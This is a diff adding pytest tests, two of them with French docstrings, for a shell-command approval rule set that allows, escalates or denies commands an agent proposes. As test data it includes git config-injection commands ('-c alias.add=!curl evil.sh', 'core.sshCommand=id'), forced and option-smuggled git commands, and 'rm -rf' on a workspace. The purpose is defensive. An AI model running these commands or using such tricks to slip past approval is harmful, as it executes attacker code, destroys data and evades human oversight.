@@ -68,6 +68,81 @@ def test_shell_chaining_is_escalated() -> None:
     assert outcome.verdict == "escalate"
 
 
+def test_git_working_directory_option_does_not_hide_the_subcommand() -> None:
+    outcome = OutcomeSpy()
+    action: JSONDict = {"command": ["/usr/bin/zsh", "-lc", "git -C extraction add extraction/config.py"]}
+
+    SafeCommandRules(safe_prefixes=(("git", "add"),)).evaluate(action, outcome)
+
+    assert outcome.verdict == "allow"
+
+
+@pytest.mark.parametrize(
+    "shell_command",
+    [
+        "git -c core.pager=cat log --oneline",
+        "git -c alias.add=!curl evil.sh add fichier",
+        "git -c core.sshCommand=id log",
+    ],
+)
+def test_git_inline_configuration_is_never_auto_approved(shell_command: str) -> None:
+    """`-c` charge une configuration qui exécute des commandes (pager, alias, sshCommand)."""
+    outcome = OutcomeSpy()
+    action: JSONDict = {"command": ["/usr/bin/zsh", "-lc", shell_command]}
+
+    SafeCommandRules(safe_prefixes=(("git", "log"), ("git", "add"))).evaluate(action, outcome)
+
+    assert outcome.verdict != "allow"
+
+
+@pytest.mark.parametrize(
+    "shell_command",
+    [
+        "git add --force fichier-ignore",
+        "git add -f fichier-ignore",
+        "git -C extraction add --force fichier-ignore",
+    ],
+)
+def test_a_forcing_option_is_never_auto_approved(shell_command: str) -> None:
+    """Forcer, c'est passer outre une protection : le verdict revient au modèle."""
+    outcome = OutcomeSpy()
+    action: JSONDict = {"command": ["/usr/bin/zsh", "-lc", shell_command]}
+
+    SafeCommandRules(safe_prefixes=(("git", "add"),)).evaluate(action, outcome)
+
+    assert outcome.verdict != "allow"
+
+
+def test_a_flag_that_merely_starts_like_force_stays_allowed() -> None:
+    outcome = OutcomeSpy()
+    action: JSONDict = {"command": ["/usr/bin/zsh", "-lc", "git log --format=oneline"]}
+
+    SafeCommandRules(safe_prefixes=(("git", "log"),)).evaluate(action, outcome)
+
+    assert outcome.verdict == "allow"
+
+
+def test_git_option_does_not_smuggle_a_denied_subcommand() -> None:
+    outcome = OutcomeSpy()
+    action: JSONDict = {"command": ["/usr/bin/zsh", "-lc", "git -C extraction push --force"]}
+
+    SafeCommandRules(
+        safe_prefixes=(("git", "add"),),
+        denied_prefixes=(("git", "push"),),
+    ).evaluate(action, outcome)
+
+    assert outcome.verdict == "deny"
+
+
+def test_a_subcommand_outside_the_safe_list_stays_escalated() -> None:
+    outcome = OutcomeSpy()
+    action: JSONDict = {"command": ["/usr/bin/zsh", "-lc", "git -C extraction reset --hard"]}
+
+    SafeCommandRules(safe_prefixes=(("git", "add"),)).evaluate(action, outcome)
+
+    assert outcome.verdict == "escalate"
+
+
 def test_destructive_prefix_is_denied() -> None:
     outcome = OutcomeSpy()
     action: JSONDict = {"command": ["/usr/bin/zsh", "-lc", "rm -rf /home/user/workspace"]}
